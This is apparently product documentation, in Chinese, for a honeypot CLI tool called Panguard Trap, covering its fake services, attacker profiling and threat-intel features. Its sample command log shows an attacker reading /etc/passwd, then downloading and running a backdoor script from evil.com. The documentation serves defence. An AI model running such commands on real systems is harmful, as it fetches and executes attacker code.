# Panguard Trap / 蜜罐指南 `[PRO]`

> 部署假服務引誘攻擊者，收集情報，了解誰在攻擊你。
>
> 啟動和停止蜜罐服務需要 **Pro** 以上方案。狀態查詢、設定檢視和情報查看為 Free。

---

## 什麼是蜜罐？

蜜罐（Honeypot）是刻意暴露的假服務。正常使用者不會碰到它，只有攻擊者會。當有人連上蜜罐，你就知道有人在試探你的系統。

Panguard Trap 不只記錄連線，還會分析攻擊者的行為，判斷他的技術水準和意圖。

---

## 快速開始

```bash
# 登入（如果還沒有）
panguard login

# 啟動蜜罐（SSH + HTTP）（需要 Pro）
panguard trap start --services ssh,http

# 查看狀態（Free）
panguard trap status

# 查看攻擊者側寫（Free）
panguard trap profiles

# 查看威脅情報（Free）
panguard trap intel
```

---

## 8 種蜜罐服務

| 服務   | 預設 Port | 模擬目標         |
| ------ | --------- | ---------------- |
| SSH    | 2222      | OpenSSH 伺服器   |
| HTTP   | 8080      | Web 伺服器       |
| FTP    | 2121      | FTP 伺服器       |
| SMB    | 4450      | Windows 檔案共享 |
| MySQL  | 3307      | MySQL 資料庫     |
| RDP    | 3390      | Windows 遠端桌面 |
| Telnet | 2323      | Telnet 伺服器    |
| Redis  | 6380      | Redis 快取       |

### 啟動特定服務

```bash
# 只啟動 SSH 和 HTTP 蜜罐
panguard trap start --services ssh,http

# 啟動所有蜜罐
panguard trap start --services ssh,http,ftp,smb,mysql,rdp,telnet,redis

# 自訂 port
panguard trap start --services ssh --port 22222
```

---

## 攻擊者側寫

Panguard Trap 最強大的功能是自動分析攻擊者行為：

### 技術等級分類

| 等級          | 特徵                       | 範例行為                   |
| ------------- | -------------------------- | -------------------------- |
| Script Kiddie | 使用公開工具，無自訂能力   | 跑 hydra 暴力破解預設密碼  |
| Advanced      | 有一定技術，會調整攻擊策略 | 嘗試多種 exploit，掃描內網 |
| APT           | 高度專業，目標明確         | 客製化 payload，長期潛伏   |

### 攻擊意圖分類

Trap 會分析攻擊者的行為模式來推測其意圖：

- **偵察** — 掃描 port、收集系統資訊
- **暴力破解** — 大量密碼嘗試
- **漏洞利用** — 嘗試已知 CVE exploit
- **橫向移動** — 嘗試存取內網其他主機
- **資料竊取** — 嘗試下載或傳輸檔案
- **持久化** — 嘗試安裝後門或 cron job

### 查看側寫報告

```bash
panguard trap profiles
```

```
  ── Attacker Profiles ──────────────────

  Attacker #1: 203.0.113.50
    Level:     Script Kiddie
    Intent:    Brute Force
    Sessions:  47
    Duration:  2h 15m
    Creds:     admin/admin, root/123456 (12 attempts)
    Tools:     hydra 9.4

  Attacker #2: 198.51.100.23
    Level:     Advanced
    Intent:    Reconnaissance -> Exploitation
    Sessions:  3
    Duration:  45m
    Commands:  uname -a, cat /etc/passwd, wget http://...
    Tools:     Custom scripts
```

---

## 收集的情報

### 憑證收集

記錄攻擊者嘗試的所有帳號密碼組合：

```
  ── Captured Credentials ───────────────

  SSH:
    root / password       (847 attempts)
    admin / admin         (234 attempts)
    root / 123456         (156 attempts)
    ubuntu / ubuntu       (89 attempts)
```

### 指令記錄

記錄攻擊者登入後執行的所有指令：

```
  ── Command Log ────────────────────────

  Session: 203.0.113.50 @ 2024-01-15 14:23
    $ uname -a
    $ cat /etc/passwd
    $ wget http://evil.com/backdoor.sh
    $ chmod +x backdoor.sh
    $ ./backdoor.sh
```

---

## 與 Guard 和 Threat Cloud 整合

### Guard 整合

Trap 的偵測結果自動餵入 Guard：

- 攻擊者 IP 自動加入 Guard 的封鎖清單
- 攻擊模式轉換為 Sigma 規則候選
- 收集的 IoC 加入本地威脅情報庫

### Threat Cloud 整合

Trap 收集的情報可匿名上傳到 Threat Cloud：

```bash
# 啟用 Threat Cloud 上傳
panguard trap start --services ssh,http

# 停用 Threat Cloud 上傳
panguard trap start --services ssh,http --no-cloud
```

---

## 安全注意事項

1. **蜜罐 port 應與真實服務不同** — SSH 蜜罐用 2222，不要用 22
2. **蜜罐是隔離的** — 攻擊者無法從蜜罐存取你的真實系統
3. **限制資源** — 蜜罐有記憶體和 CPU 限制，不會被濫用

---

## CLI 選項

```
panguard trap <command> [options]

Commands:
  start              啟動蜜罐服務（Pro）
  stop               停止蜜罐服務（Pro）
  status             顯示狀態和統計（Free）
  config             顯示目前設定（Free）
  profiles           顯示攻擊者側寫（Free）
  intel              顯示威脅情報摘要（Free）

Options:
  --services <types>     服務類型（逗號分隔：ssh,http,ftp,...）
  --data-dir <path>      資料目錄
  --no-cloud             停用 Threat Cloud 上傳
```

完整 CLI 參考見 [CLI 指令參考](../reference/cli.md)。
